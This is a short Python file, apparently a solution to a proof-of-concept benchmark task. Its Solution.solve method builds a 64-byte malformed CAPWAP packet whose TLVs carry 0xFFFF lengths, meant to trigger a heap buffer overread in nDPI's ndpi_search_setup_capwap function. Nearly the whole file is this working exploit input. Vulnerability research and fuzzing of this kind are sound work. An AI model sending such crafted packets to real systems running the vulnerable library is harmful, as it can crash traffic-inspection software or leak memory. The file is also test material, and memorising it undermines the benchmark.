import os
from typing import ByteString


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Crafted CAPWAP-like payload intended to trigger heap buffer overread
        # in ndpi_search_setup_capwap in the vulnerable version.
        payload = bytearray(64)

        # CAPWAP header (first 8 bytes)
        payload[0] = 0x22  # Version / HLEN nibble set to 2 to yield header length of 8 bytes
        payload[1] = 0x00
        payload[2] = 0x00
        payload[3] = 0x00
        payload[4] = 0x00
        payload[5] = 0x00
        payload[6] = 0x00
        payload[7] = 0x00

        # Control message header (next 8 bytes, approximated)
        payload[8] = 0x00   # Message Type hi
        payload[9] = 0x01   # Message Type lo
        payload[10] = 0x00  # Message Length hi (0x0030 = 48)
        payload[11] = 0x30  # Message Length lo
        payload[12] = 0x00  # Sequence / Flags (approx)
        payload[13] = 0x00
        payload[14] = 0x00
        payload[15] = 0x00

        # TLVs starting at offset 16
        # Each TLV: [type_hi, type_lo, len_hi, len_lo]
        # Use many possible types (1..12) with very large length 0xFFFF
        types = list(range(1, 13))
        offset = 16
        for t in types:
            if offset + 4 > len(payload):
                break
            payload[offset] = (t >> 8) & 0xFF
            payload[offset + 1] = t & 0xFF
            payload[offset + 2] = 0xFF  # length hi
            payload[offset + 3] = 0xFF  # length lo
            offset += 4

        return bytes(payload)